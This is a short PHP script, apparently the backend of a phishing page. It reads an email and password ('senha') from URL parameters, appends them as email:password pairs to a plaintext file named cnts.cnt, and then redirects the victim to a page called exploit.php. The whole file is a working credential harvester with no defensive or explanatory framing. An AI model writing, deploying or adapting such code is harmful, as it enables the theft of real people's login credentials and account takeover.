<?php
$Email = $_GET['email'];
$Senha = $_GET['senha'];
if($Email != "" and $Senha != "")
{
	$myfile = fopen("cnts.cnt", "r+") or die("Nao foi possivel abrir");
	$cnt = $Email . ":" . $Senha;
	$anterior = fread($myfile,filesize("cnts.cnt"));
	if(strpos($anterior, $cnt) !== false){
		fclose($myfile);
		header("Location: index.php?status=Conta ja Cadastrada");
		exit();
	}else{
		$txt = $cnt . "\n";
		fwrite($myfile, $txt);
		fclose($myfile);
		header("Location: exploit.php");
		exit();
	}
	
}else
{
	 header("Location: index.php?status=Ocorreu um error");
     exit();
}
?>